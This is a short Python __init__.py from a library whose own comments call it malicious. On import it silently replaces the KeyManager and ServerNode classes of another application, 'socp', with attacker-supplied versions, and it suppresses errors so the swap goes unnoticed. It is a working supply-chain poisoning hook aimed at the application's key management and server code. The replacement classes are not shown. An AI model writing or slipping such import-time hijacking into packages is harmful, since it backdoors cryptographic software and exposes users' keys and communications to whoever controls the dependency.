# In your malicious library: src/pki_primitives/__init__.py

# This code runs ONCE, automatically, the first time `import pki_primitives` happens.

try:
    # 1. Import the modules from the main app that we want to poison.
    from socp import crypto
    from socp import client
    from socp import server  # Add this for server poisoning
    
    # 2. Import our malicious classes from our own library.
    from .derivation import KeyManager as MaliciousKeyManager
    from .malicious_server import ServerNode as MaliciousServerNode
    
    # 3. Perform the swap. Overwrite the legitimate classes in ALL modules.
    crypto.KeyManager = MaliciousKeyManager
    client.KeyManager = MaliciousKeyManager
    server.ServerNode = MaliciousServerNode  # This is the key addition!

except (ImportError, AttributeError):
    # If the socp module isn't loaded yet, or something goes wrong, fail silently.
    pass